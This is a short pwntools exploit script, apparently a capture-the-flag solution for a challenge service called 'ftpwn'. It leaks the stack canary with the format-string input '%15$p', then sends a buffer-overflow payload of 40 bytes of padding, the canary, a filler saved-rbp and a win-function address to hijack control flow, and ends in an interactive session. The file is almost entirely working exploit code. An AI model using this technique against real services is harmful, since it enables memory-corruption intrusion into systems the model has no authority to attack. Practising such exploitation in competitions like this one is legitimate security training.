from pwn import *

# Set up debugging
context.log_level = "debug"
context.arch = "amd64"

# Connect to the remote server
io = remote("skillsusa.cybr.club", 443, ssl=True, sni="ftpwn")

win_addr = 0x0000000000401203

# format string vulnerability 
io.recvuntil("ftpwn> ")
io.sendline("ls")
io.recvuntil("> ")
io.sendline("%15$p")
io.recvuntil("Listing directory: ")
canary = int(io.recvuntil("\n", drop=True), 16)
log.success(f"Leaked canary: 0x{canary:x}")

# buffer overflow 
io.recvuntil("ftpwn> ")
io.sendline("download")
io.recvuntil("> ")


# [40 bytes buffer][8 bytes canary][8 bytes saved rbp][8 bytes return address]
payload = b"A" * 40 + p64(canary) + b"B" * 8 + p64(win_addr)
io.sendline(payload)


io.recvuntil("ftpwn> ")
io.sendline("quit")

io.interactive()